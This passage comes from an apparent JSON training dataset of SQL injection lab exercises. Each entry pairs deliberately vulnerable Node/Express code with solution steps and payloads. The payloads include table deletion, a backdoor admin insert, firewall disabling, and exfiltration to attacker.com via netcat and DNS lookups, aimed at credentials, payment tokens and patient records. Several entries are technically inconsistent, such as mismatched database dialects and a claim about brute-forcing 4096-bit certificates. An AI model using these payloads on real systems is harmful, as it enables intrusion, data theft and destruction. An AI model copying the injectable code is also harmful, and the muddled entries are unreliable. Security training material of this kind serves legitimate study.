      "1. Terminate initial query: '; DROP TABLE audit_log--",
      "2. Create backdoor account: '; INSERT INTO users VALUES('hacker','pass',1)--",
      "3. Disable security controls: '; UPDATE settings SET firewall=0--",
      "4. Verify through secondary access channel"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/inventory',(req,res)=>{const sku=req.query.sku;db.query(`SELECT stock FROM products WHERE sku='${sku}'`);});",
    "payloads": [
      "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--",
      "'; COPY products TO PROGRAM 'nc attacker.com 4444'--"
    ]
  },
  {
    "Lab scenario": "Travel Booking UNION SQLi in Flight Search",
    "Lab Description": "Flight search vulnerable to UNION-based data exfiltration through airline parameter",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Identify injectable parameter with Burp",
      "2. Find null columns: ' UNION SELECT null,null,null--",
      "3. Extract DB version: ' UNION SELECT 1,@@version,3--",
      "4. Dump credentials: ' UNION SELECT null,email,password FROM users--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/flights',(req,res)=>{const airline=req.query.airline;db.query(`SELECT * FROM flights WHERE airline='${airline}'`);});",
    "payloads": [
      "' UNION SELECT user(),null,database()--",
      "' AND 1=0 UNION SELECT 1,2,3--"
    ]
  },
  {
    "Lab scenario": "Cryptocurrency Exchange Blind SQLi in Withdrawals",
    "Lab Description": "Withdrawal validation vulnerable to time-based inference attacks",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Detect response time differences",
      "2. Use conditional delays: ' AND IF(ASCII(SUBSTR(secret,1,1))>50,SLEEP(2),0--",
      "3. Automate with binary search algorithm",
      "4. Use bitwise operations for efficient extraction"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/withdraw',(req,res)=>{const addr=req.body.address;db.query(`SELECT balance FROM wallets WHERE address='${addr}'`);});",
    "payloads": [
      "' AND IF(ASCII(SUBSTR((SELECT secret_key),1,1))>50,BENCHMARK(1e6,MD5(1)),0--",
      "'||(SELECT CASE WHEN COUNT(*)>0 THEN pg_sleep(3) END FROM admins)--"
    ]
  },
  {
    "Lab scenario": "Smart Home Boolean SQLi in Device Naming",
    "Lab Description": "Device renaming feature vulnerable to boolean-based inference through status codes",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Detect 200/404 response differences",
      "2. Confirm vulnerability: ' OR 1=1-- vs ' OR 1=2--",
      "3. Use substring comparison: ' AND SUBSTR(password,1,1)='a'--",
      "4. Reconstruct credentials through brute-force"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/rename',(req,res)=>{const name=req.body.name;db.query(`UPDATE devices SET name='${name}' WHERE id=1`);});",
    "payloads": [
      "' OR (SELECT COUNT(*) FROM users)=5--",
      "' AND EXISTS(SELECT 1 FROM config WHERE secret LIKE 'a%')--"
    ]
  },
  {
    "Lab scenario": "Banking Portal UNION-Based SQLi in Loan Application Sorting",
    "Lab Description": "The loan application portal constructs ORDER BY clauses using unsanitized user input. The PostgreSQL backend leaks column counts through verbose type mismatch errors. To solve: Extract account numbers and credit scores using NULL-padded UNION payloads while bypassing WAF quote filtering with CHR() function.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept GET /loans?sort=app_date with Burp Suite",
      "Trigger error with payload: app_date' UNION SELECT 1,CHR(97)--",
      "Determine column count using incremental NULL padding",
      "Craft final payload: ' UNION SELECT NULL,account_number::text,credit_score FROM applications--",
      "Validate extracted data through fund transfer API"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/loans', (req, res) => {\n  const sort = req.query.sort || 'app_date';\n  const query = `SELECT id, amount, app_date FROM loans ORDER BY ${sort}`;\n  \n  pool.query(query, (err, result) => {\n    if(err) res.status(500).send(`Error: ${err.message}\\nQuery: ${query}`);\n    else res.json(result.rows);\n  });\n});",
    "payloads": [
      "app_date' UNION SELECT NULL,CHR(97),NULL--",
      "' UNION SELECT NULL,current_database(),NULL,NULL--"
    ]
  },
  {
    "Lab scenario": "IoT Fleet Management Boolean-Based SQLi in Geo-Fencing",
    "Lab Description": "Vehicle tracking system uses unsanitized location parameters in HAVING clauses. The SQLite backend returns HTTP 204/404 status codes based on query validity. To solve: Extract AWS IoT certificates through bitwise binary search of SUBSTR(hex(cert),1,1) comparisons using Python requests with 0.5s timing thresholds.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture POST /geo-fence request with OWASP ZAP",
      "Identify boolean trigger: ' HAVING 1=1 AND (SELECT hex(substr(cert,1,1)) FROM iot_certs)='41'--",
      "Automate with sqlmap --technique=B --level=5",
      "Brute-force 4096-bit certificates using response differentials",
      "Validate certs through MQTT broker connection"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/geo-fence', (req, res) => {\n  const radius = req.body.radius;\n  const query = `SELECT vehicle_id FROM locations GROUP BY vehicle_id HAVING ${radius}`;\n  \n  db.get(query, (err, row) => {\n    res.status(row ? 204 : 404).end();\n  });\n});",
    "payloads": [
      "1=1 AND (ASCII(SUBSTR(cert,1,1)) & 128)=128",
      "EXISTS(SELECT 1 FROM sqlite_master WHERE tbl_name='cert_store')"
    ]
  },
  {
    "Lab scenario": "Healthcare API Time-Based SQLi in Patient Lookup",
    "Lab Description": "Patient search endpoint uses unsanitized input in WHERE clauses with identical error pages. The MySQL backend allows stacked queries through Promises. To solve: Exfiltrate diagnosis codes through DNS-based out-of-band channel using conditional SLEEP() delays and LOAD_FILE() function.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept POST /api/patient-search with Burp Suite",
      "Verify delay: ' OR IF(ASCII(SUBSTR(diagnosis,1,1))>100,SLEEP(5),0)--",
      "Configure Interactsh client for DNS monitoring",
      "Craft payload: '; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT diagnosis_code),'.attacker.com'))--",
      "Correlate DNS logs with medical codes"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/api/patient-search', (req, res) => {\n  const mrn = req.body.mrn;\n  const query = `SELECT * FROM patients WHERE mrn='${mrn}'`;\n  \n  db.query(query, (err, result) => {\n    res.json(result.length > 0 ? 200 : 404);\n  });\n});",
    "payloads": [
      "' OR BENCHMARK(10000000,SHA1('a'))--",
      "'; SELECT SLEEP(5) FROM patients WHERE diagnosis LIKE 'C%'--"
    ]
  },
  {
    "Lab scenario": "E-Commerce Platform Error-Based SQLi in Cart Discounts",
    "Lab Description": "Shopping cart discount system leaks PostgreSQL geometry function errors through debug headers. The application uses unsanitized JSON input in ST_Contains() predicates. To solve: Extract PCI tokens through forced type conversion errors in polygon coordinate parameters.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Modify POST /apply-discount payload in Postman",
      "Trigger error: {\"polygon\":\"'||(SELECT token FROM payments)||'\"}",
      "Parse leaked tokens from ST_GeomFromText errors",
      "Bypass WAF using MULTIPOINT() function with nested selects",
      "Validate tokens through payment gateway sandbox"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/apply-discount', (req, res) => {\n  const polygon = req.body.polygon;\n  const query = `SELECT * FROM discounts WHERE ST_Contains('${polygon}', coordinates)`;\n  \n  pool.query(query, (err, result) => {\n    if(err) res.set('X-PostGIS-Error', err.message);\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "'||(SELECT token FROM payments LIMIT 1)||'",
      "MULTIPOINT((SELECT token FROM payments))"
    ]
  },
  {
    "Lab scenario": "Government Portal UNION SQLi in FOIA Request Sorting",
    "Lab Description": "Freedom of Information Act request portal concatenates user input into ORDER BY clauses. The MSSQL backend allows type coercion through XML PATH queries. To solve: Exfiltrate classified document metadata using FOR XML EXPLICIT payloads and CDATA section bypasses.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept GET /foia?sort=req_date with Burp Suite",
      "Craft payload: req_date' UNION SELECT NULL,(SELECT TOP 1 doc_title FOR XML PATH('')),NULL--",
      "Bypass content security policies using ADODB.Stream",
      "Reconstruct XML fragments from chunked responses",
      "Validate metadata through document archive API"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/foia', (req, res) => {\n  const sort = req.query.sort || 'req_date';\n  const query = `SELECT request_id, status FROM foia_requests ORDER BY ${sort}`;\n  \n  mssql.query(query, (err, result) => {\n    res.json(result.recordset);\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL,CAST(doc_title AS XML),NULL FROM classified--",
      "'; BEGIN TRY SELECT CONVERT(XML,(SELECT TOP 1 doc_content)) END TRY BEGIN CATCH SELECT ERROR_MESSAGE() END CATCH--"
    ]
  },
  {
    "Lab scenario": "CMS Boolean-Based SQLi in Comment Filtering",
    "Lab Description": "A content management system (CMS) implements comment filtering using dynamic SQL in the moderation panel. The backend uses SQLite with direct string interpolation. Input from the `filter` query string parameter is passed directly into the `WHERE` clause without proper sanitization. This allows attackers to infer database content using Boolean-based payloads. The application leaks the number of results and alters page rendering based on the number of rows returned. To solve: Use Boolean-based SQLi to extract admin credentials by measuring UI response behaviors triggered by conditional logic.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the GET /moderation?filter= URL parameter.",
      "Test for Boolean-based injection using payloads like '1=1' and '1=0' and observe UI rendering differences.",
      "Craft SQLi payloads to test for presence of specific user accounts using: ' OR username='admin'--",
      "Refine the attack using substring-based conditional logic: ' OR substr(password,1,1)='a'--",
      "Use sqlmap with --technique=B to automate extraction: sqlmap -u 'http://target/moderation?filter=1' --technique=B --dump"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE comments (id INTEGER PRIMARY KEY, username TEXT, message TEXT)\");\n  db.run(\"INSERT INTO comments (username, message) VALUES ('admin', 'Sensitive admin post')\");\n  db.run(\"INSERT INTO comments (username, message) VALUES ('user1', 'Hello world')\");\n});\n\napp.get('/moderation', (req, res) => {\n  const filter = req.query.filter || '1=1';\n  const query = `SELECT * FROM comments WHERE ${filter}`;\n  console.log(\"Executing query:\", query);\n  db.all(query, [], (err, rows) => {\n    if (err) return res.status(500).send('Internal error');\n    res.send(`<h1>Moderation Results (${rows.length})</h1>` + rows.map(r => `<p>${r.username}: ${r.message}</p>`).join(''));\n  });\n});\n\napp.listen(3000, () => console.log('CMS running on http://localhost:3000'));",
    "payloads": [
      "' OR 1=1--",
      "' OR username='admin'--",
      "' OR LENGTH(password)=8--",
      "' OR SUBSTR(password,1,1)='a'--",
      "' OR (SELECT COUNT(*) FROM comments WHERE username='admin')>0--"
    ]
  },
  {
    "Lab scenario": "Banking portal SQL injection in ORDER BY clause",
    "Lab Description": "The application fails to properly sanitize user inputs used in the ORDER BY clause, allowing SQL injection. The application constructs SQL queries dynamically without validation. To solve: exploit the injection to retrieve sensitive database information through ORDER BY-based manipulation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept requests and analyze parameters",
      "Inject ' ORDER BY 3 -- to test column enumeration",
      "Inject UNION SELECT NULL,NULL -- ",
      "Adjust number of columns in UNION until no error is shown",
      "Dump all table names using sqlmap"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\nconst mysql = require('mysql');\nconst connection = mysql.createConnection({host: 'localhost', user: 'root', password: '', database: 'bank'});\n\napp.get('/accounts', (req, res) => {\n    const sort = req.query.sort;\n    const query = \"SELECT * FROM accounts ORDER BY \" + sort;\n    connection.query(query, (err, results) => {\n        if (err) return res.status(500).send(\"Error: \" + err);\n        res.send(results);\n    });\n});",
    "payloads": [
      "' ORDER BY 3 --",
      "' UNION SELECT NULL,NULL -- ",
      "' OR '1'='1' LIMIT 1 OFFSET 1 -- "
    ]
  },
  {
    "Lab scenario": "CMS SQL injection in Login endpoint",
    "Lab Description": "The application directly includes unvalidated user inputs into SQL queries at the login endpoint. This allows attackers to bypass authentication. To solve: exploit the injection to log in as admin without credentials.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Postman to observe endpoint behavior with crafted inputs",
      "Inject ' OR '1'='1 and observe behavior",
      "Craft payload with OR 1=1 LIMIT 1 OFFSET 1 -- ",
      "Tune boolean payloads for nested conditions",
      "Extract user credentials from users table"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/login', (req, res) => {\n    const username = req.query.username;\n    const password = req.query.password;\n    const query = \"SELECT * FROM users WHERE username = '\" + username + \"' AND password = '\" + password + \"'\";\n    db.query(query, (err, result) => {\n        if (err) console.log(\"Login error:\", err);\n        if (result.length > 0) res.send(\"Login success\");\n        else res.send(\"Login failed\");\n    });\n});",
    "payloads": [
      "admin' -- ",
      "' OR '1'='1",
      "' OR '1'='1' LIMIT 1 OFFSET 1 -- "
    ]
  },
  {
    "Lab scenario": "API gateway SQL injection in GROUP BY clause",
    "Lab Description": "The backend API dynamically builds SQL queries using user-controlled data in the GROUP BY clause. Lack of input validation enables attackers to interfere with grouping logic. To solve: exploit grouping to reveal data from unauthorized rows.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Run OWASP ZAP spider and passive scan on target endpoint",
      "Inspect server response to malformed inputs for SQL errors",
      "Inject ' OR 1=1#",
      "Use sqlmap --level=5 --technique=U to fully exploit",
      "Exfiltrate database version via SELECT @@version"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/device', (req, res) => {\n    const group = req.body.group;\n    const query = \"SELECT * FROM devices GROUP BY \" + group;\n    connection.query(query, (err, result) => {\n        if (err) return res.status(500).send(err.message);\n        res.json(result);\n    });\n});",
    "payloads": [
      "' OR 1=1#",
      "' UNION SELECT username , password FROM users -- ",
      "' ORDER BY 3 --"
    ]
  },
  {
    "Lab scenario": "IoT dashboard SQL injection in WHERE clause",
    "Lab Description": "A search feature on the IoT dashboard uses user inputs directly in a WHERE clause without proper escaping. This introduces SQL injection. To solve: bypass filtering and enumerate connected devices.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use sqlmap with --risk=3 for deep analysis of form fields",
      "Use Boolean conditions to detect differences in responses",
      "Use ' OR SLEEP(5)-- for time-based inference",
      "Tune boolean payloads for nested conditions",
      "Capture HTTP response with leaked data"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search', (req, res) => {\n    const device = req.query.device;\n    const query = \"SELECT * FROM sensors WHERE name = '\" + device + \"'\";\n    db.query(query, (err, result) => {\n        if (err) res.send(err.message);\n        else res.json(result);\n    });\n});",
    "payloads": [
      "' OR SLEEP(5)--",
      "' OR '1'='1",
      "' UNION SELECT NULL,NULL -- "
    ]
  },
  {
    "Lab scenario": "Banking portal SQL injection in HAVING condition",
    "Lab Description": "The banking portal allows advanced filtering of transactions using a HAVING clause. It fails to validate inputs used in aggregate functions. To solve: manipulate HAVING to leak high-value transaction data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept requests and analyze parameters",
      "Inject ' OR '1'='1 and observe behavior",
      "Use ' OR SLEEP(5)-- for time-based inference",
      "Adjust number of columns in UNION until no error is shown",
      "Extract user credentials from users table"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter', (req, res) => {\n    const amount = req.query.amount;\n    const query = \"SELECT user, SUM(balance) as total FROM transactions GROUP BY user HAVING total > \" + amount;\n    connection.query(query, (err, result) => {\n        if (err) return res.status(500).send(\"Error: \" + err);\n        res.json(result);\n    });\n});",
    "payloads": [
      "' OR SLEEP(5)--",
      "' UNION SELECT NULL,NULL -- ",
      "' OR '1'='1"
    ]
  },
  {
    "Lab scenario": "CMS SQL injection in search query with ORDER BY",
    "Lab Description": "The CMS search feature uses unvalidated user input in an ORDER BY clause. It fails to whitelist columns, allowing attackers to control the ordering logic and perform SQL injection. To solve: enumerate columns and extract hidden post metadata.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to fuzz the `sort` parameter",
      "Inject ' ORDER BY 1 -- to identify column range",
      "Use UNION SELECT to inject crafted data",
      "Enumerate column names via error-based injection",
      "Extract hidden metadata from 'posts' table"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search', (req, res) => {\n  const sort = req.query.sort;\n  const query = `SELECT title, body FROM posts ORDER BY ${sort}`;\n  db.query(query, (err, result) => {\n    if (err) return res.status(500).send(err.message);\n    res.json(result);\n  });\n});",
    "payloads": [
      "1; DROP TABLE posts --",
      "' ORDER BY 3 --",
      "' UNION SELECT NULL,NULL -- "
    ]
  },
  {
    "Lab scenario": "IoT dashboard SQL injection in API POST parameter",
    "Lab Description": "The IoT backend API directly includes POST body parameters in SQL statements without sanitization. Malicious inputs can alter query logic. To solve: perform a time-based blind SQL injection to confirm the flaw and extract device config data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send malformed body parameters",
      "Inject payloads like ' OR SLEEP(5)-- to test time delay",
      "Use sqlmap with --technique=T and --level=5",
      "Confirm data exfiltration via timing difference",
      "Dump device_config table"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/updateDevice', (req, res) => {\n  const deviceId = req.body.deviceId;\n  const query = `UPDATE devices SET active = 1 WHERE id = '${deviceId}'`;\n  db.query(query, (err, result) => {\n    if (err) res.status(500).send(err.message);\n    else res.send(\"Updated\");\n  });\n});",
    "payloads": [
      "' OR SLEEP(5)--",
      "' OR '1'='1",
      "' UNION SELECT NULL,NULL -- "
    ]
  },
  {
    "Lab scenario": "Banking portal SQL injection in login audit trail",
    "Lab Description": "Login audit events are stored using direct SQL inserts based on user input. Attackers can modify query structure to leak historical login data. To solve: inject into logging function to read records from the audit table.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to capture login request",
      "Inject a crafted username that ends in SQL payload",
      "Observe error-based messages in the response",
      "Use UNION SELECT with login_audit columns",
      "Extract timestamp and IP from logs"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/login', (req, res) => {\n  const username = req.body.username;\n  const query = `INSERT INTO login_audit (user, time) VALUES ('${username}', NOW())`;\n  db.query(query, (err) => {\n    if (err) return res.send(\"Error: \" + err);\n    res.send(\"Login recorded\");\n  });\n});",
    "payloads": [
      "attacker'); SELECT * FROM login_audit --",
      "' UNION SELECT NULL --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "API gateway SQL injection in filter parameter",
    "Lab Description": "The API gateway allows filtering of user data using unvalidated query parameters. A crafted injection in the `filter` parameter allows full table extraction. To solve: exploit the filter field with UNION-based injection.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to submit a GET request with `filter` param",
      "Test with basic ' OR '1'='1' -- to confirm injection",
      "Inject UNION SELECT with nulls until correct column count is found",
      "Replace nulls with sensitive column names",
      "Dump users table via UNION SELECT"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/users', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT * FROM users WHERE role = '${filter}'`;\n  db.query(query, (err, result) => {\n    if (err) res.send(\"Error: \" + err);\n    else res.json(result);\n  });\n});",
    "payloads": [
      "admin' --",
      "' UNION SELECT NULL,NULL,NULL --",
      "' OR '1'='1"
    ]
  },
  {
    "Lab scenario": "CMS SQL injection in article comments section",
    "Lab Description": "The comment section of articles directly injects user content into database insert queries. When users modify request parameters, SQL injection is possible. To solve: exploit blind SQLi to enumerate database schema.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept comment POST request",
      "Modify comment body with time-based injection like '); SLEEP(3);--",
      "Detect delay in server response",
      "Use sqlmap with --technique=T to extract schema info",
      "Enumerate article metadata and comments"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/comment', (req, res) => {\n  const comment = req.body.text;\n  const query = `INSERT INTO comments (body) VALUES ('${comment}')`;\n  db.query(query, (err) => {\n    if (err) return res.send(\"Error logging comment: \" + err);\n    res.send(\"Comment posted\");\n  });\n});",
    "payloads": [
      "'); SLEEP(3);--",
      "' OR '1'='1",
      "' UNION SELECT NULL,NULL --"
    ]
  },
  {
    "Lab scenario": "API gateway SQL injection in HTTP headers",
    "Lab Description": "The API gateway logs user-agent headers directly into the SQL query without sanitization. Attackers can inject SQL through the User-Agent field. To solve: craft a malicious User-Agent to extract user data from the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to modify HTTP headers",
      "Inject SQL payloads into the User-Agent field like ' OR '1'='1' --",
      "Observe any changes in response to the injection",
      "Use UNION SELECT to leak sensitive data",
      "Dump user credentials and sensitive information"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/api', (req, res) => {\n  const userAgent = req.headers['user-agent'];\n  const query = `SELECT * FROM users WHERE agent = '${userAgent}'`; \n  db.query(query, (err, result) => {\n    if (err) return res.status(500).send('Error: ' + err);\n    res.json(result);\n  });\n});",
    "payloads": [
      "' OR '1'='1' --",
      "' UNION SELECT NULL,NULL --",
      "' OR '1'='1' LIMIT 1 OFFSET 0 --"
    ]
  },
  {
    "Lab scenario": "IoT dashboard SQL injection in device control parameter",
    "Lab Description": "The device control API accepts user input directly and uses it in an SQL query to change device status. Lack of input validation makes it vulnerable to SQL injection. To solve: inject SQL payloads to control device actions and extract sensitive data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send requests with different device IDs",
      "Inject SQL payloads such as ' OR 1=1 -- into device ID field",
      "Observe successful injection with response changes",
      "Examine the database to extract connected devices",
      "Perform a UNION injection to exfiltrate data from devices table"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/controlDevice', (req, res) => {\n  const deviceId = req.body.deviceId;\n  const query = `UPDATE devices SET status = 'active' WHERE id = '${deviceId}'`; \n  db.query(query, (err, result) => {\n    if (err) return res.status(500).send('Error: ' + err);\n    res.send('Device status updated');\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT NULL,NULL --",
      "' OR '1'='1' LIMIT 1 OFFSET 1 --"
    ]
  },
  {
    "Lab scenario": "Banking portal SQL injection in transaction filter",
    "Lab Description": "The banking portal allows filtering of transactions via user input. The filter parameter is directly inserted into the SQL query, making it susceptible to SQL injection. To solve: exploit the injection to dump transaction details.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept and modify filter request",
      "Inject ' OR 1=1 -- to bypass filtering logic",
      "Use UNION SELECT to retrieve sensitive transaction data",
      "Confirm data retrieval with error messages",
      "Dump transaction details from the transaction_history table"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transactions', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT * FROM transactions WHERE category = '${filter}'`; \n  db.query(query, (err, result) => {\n    if (err) return res.status(500).send('Error: ' + err);\n    res.json(result);\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT NULL,NULL --",
      "' OR '1'='1' LIMIT 1 OFFSET 1 --"
    ]
  },
  {
    "Lab scenario": "API gateway SQL injection in query string parameter",
    "Lab Description": "The API gateway exposes an endpoint that allows users to query for product information based on category. The category filter is directly inserted into the SQL query, allowing an attacker to perform SQL injection. To solve: extract product details and bypass filter conditions.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept and modify GET request parameters",
      "Inject SQL payloads like ' OR '1'='1' --",
      "Perform UNION-based injection to access product details",
      "Extract column names and sensitive product information",
      "Exfiltrate product details from the database"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/products', (req, res) => {\n  const category = req.query.category;\n  const query = `SELECT * FROM products WHERE category = '${category}'`; \n  db.query(query, (err, result) => {\n    if (err) return res.status(500).send('Error: ' + err);\n    res.json(result);\n  });\n});",
    "payloads": [
      "' OR '1'='1' --",
      "' UNION SELECT NULL,NULL --",
      "' OR '1'='1' LIMIT 1 OFFSET 1 --"
    ]
  },
  {
    "Lab scenario": "CMS SQL injection in comment filtering",
    "Lab Description": "The CMS filters out comments based on keywords before inserting them into the database. However, the filtering logic is flawed, allowing attackers to bypass restrictions using SQL injection. To solve: bypass filtering and inject malicious SQL payloads.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to modify comment content",
      "Inject SQL payloads like ' OR '1'='1' --",
      "Test by submitting comments containing UNION SELECT",
      "Bypass filtering by using SQL escape characters",
      "Dump user comment data from database"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/comment', (req, res) => {\n  const comment = req.body.text;\n  const query = `INSERT INTO comments (body) VALUES ('${comment}')`; \n  db.query(query, (err) => {\n    if (err) return res.send('Error logging comment: ' + err);\n    res.send('Comment posted');\n  });\n});",
    "payloads": [
      "');--",
      "' UNION SELECT NULL,NULL --",
      "' OR '1'='1"
    ]
  },
  {
    "Lab scenario": "API SQL injection in user profile update",
    "Lab Description": "The user profile update endpoint allows modifying the users details, but the input parameters are directly injected into SQL queries. This results in an SQL injection vulnerability. To solve: extract the database schema and update user details.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to intercept and modify the update request",
      "Inject SQL payloads like ' OR 1=1 -- to bypass authentication",
      "Exploit UNION-based injection to extract database schema",
      "Manipulate query to update user information",
      "Extract sensitive user data after successful exploitation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/updateProfile', (req, res) => {\n  const userId = req.body.userId;\n  const name = req.body.name;\n  const query = `UPDATE users SET name = '${name}' WHERE id = '${userId}'`; \n  db.query(query, (err, result) => {\n    if (err) return res.status(500).send('Error: ' + err);\n    res.send('Profile updated');\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT NULL,NULL --",
      "'; UPDATE users SET password='newpassword' WHERE id='1' --"
    ]
  },
  {
    "Lab scenario": "CMS SQL injection in comment filtering",
    "Lab Description": "The CMS allows users to submit comments, but it improperly sanitizes comment input, allowing for SQL injection. To solve: inject SQL payloads that bypass filtering and access sensitive information from the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to modify the POST request",
      "Inject SQL payloads such as ' OR '1'='1' -- to bypass filters",
      "Test for error-based feedback and adjust payload accordingly",
      "Use UNION SELECT to retrieve data from the comments table",
      "Extract user comments and sensitive metadata from the database"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/comment', (req, res) => {\n  const comment = req.body.text;\n  const query = `INSERT INTO comments (body) VALUES ('${comment}')`; \n  db.query(query, (err) => {\n    if (err) return res.send('Error logging comment: ' + err);\n    res.send('Comment posted');\n  });\n});",
    "payloads": [
      "');--",
      "' UNION SELECT NULL,NULL --",
      "' OR '1'='1' --"
    ]
  },
  {
    "Lab scenario": "Banking portal SQL injection in transaction view",
    "Lab Description": "The banking portal's transaction view feature takes a parameter to filter by account number. The input parameter is directly used in an SQL query. To solve: inject a UNION-based SQL payload to extract sensitive transaction details.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept GET request with `account` param",
      "Inject SQL payloads like ' OR '1'='1' --",
      "Test for successful injection by observing server responses",
      "Perform UNION-based injection to retrieve transaction data",
      "Dump sensitive transaction details from the database"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transactions', (req, res) => {\n  const account = req.query.account;\n  const query = `SELECT * FROM transactions WHERE account_number = '${account}'`; \n  db.query(query, (err, result) => {\n    if (err) return res.status(500).send('Error: ' + err);\n    res.json(result);\n  });\n});",
    "payloads": [
      "' OR '1'='1' --",
      "' UNION SELECT NULL,NULL --",
      "' OR '1'='1' LIMIT 1 OFFSET 0 --"
    ]
  },
  {
    "Lab scenario": "IoT device control SQL injection in configuration update",
    "Lab Description": "The device configuration API directly takes input from users and uses it in an SQL query to update device configurations. Lack of sanitization allows for SQL injection. To solve: inject payloads that allow reading sensitive device configurations.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send device configuration update requests",
      "Inject SQL payloads like ' OR '1'='1' --",
      "Observe time-based delays to confirm injection success",
      "Use UNION SELECT to dump configuration details from the devices table",
      "Extract configuration data from vulnerable IoT devices"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/updateDeviceConfig', (req, res) => {\n  const deviceId = req.body.deviceId;\n  const config = req.body.config;\n  const query = `UPDATE devices SET config = '${config}' WHERE id = '${deviceId}'`; \n  db.query(query, (err, result) => {\n    if (err) return res.status(500).send('Error: ' + err);\n    res.send('Device configuration updated');\n  });\n});",
    "payloads": [
      "' OR '1'='1' --",
      "' UNION SELECT NULL,NULL --",
      "' OR SLEEP(5) --"
    ]
  },
  {
    "Lab scenario": "API SQL injection in search endpoint",
    "Lab Description": "The APIs search feature allows users to search for products by category. However, the input is directly inserted into the SQL query, which makes it vulnerable to SQL injection. To solve: exploit the vulnerability to retrieve product data from different categories.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to capture and modify GET request",
      "Inject SQL payloads like ' OR '1'='1' --",
      "Perform UNION SELECT injection to retrieve product details",
      "Bypass filter conditions to extract product names and prices",
      "Dump product data from the products table"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search', (req, res) => {\n  const category = req.query.category;\n  const query = `SELECT * FROM products WHERE category = '${category}'`; \n  db.query(query, (err, result) => {\n    if (err) return res.status(500).send('Error: ' + err);\n    res.json(result);\n  });\n});",
    "payloads": [
      "' OR '1'='1' --",
      "' UNION SELECT NULL,NULL --",
      "' OR '1'='1' LIMIT 1 OFFSET 0 --"
    ]
  },
  {
    "Lab scenario": "Banking portal SQL injection in loan application",
